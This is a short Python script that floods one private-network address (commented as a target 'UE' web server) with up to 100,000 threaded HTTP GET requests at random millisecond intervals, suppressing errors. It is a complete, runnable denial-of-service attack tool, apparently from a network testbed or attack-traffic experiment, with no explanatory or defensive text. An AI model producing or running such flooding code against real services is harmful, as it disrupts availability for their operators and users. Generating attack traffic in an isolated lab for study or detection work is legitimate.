#!/usr/bin/env python3
import requests
import threading
import time
import random

TARGET_URL = "http://10.45.0.32:8080"  # Target UE running a web server
MAX_REQUESTS = 100000

def send_http_request():
    try:
        response = requests.get(TARGET_URL, timeout=1)
        print(f"Sent HTTP request, status: {response.status_code}")
    except requests.RequestException:
        pass  # Ignore errors (e.g., timeouts)

threads = []
request_count = 0
while request_count < MAX_REQUESTS:
    thread = threading.Thread(target=send_http_request)
    thread.start()
    threads.append(thread)
    request_count += 1
    if request_count % 100 == 0:
        print(f"Sent {request_count} HTTP requests")
    time.sleep(random.uniform(0.001, 0.01))  # Random delay between 1-10ms

# Wait for all threads to complete
for thread in threads:
    thread.join()

print(f"Sent {request_count} HTTP requests.")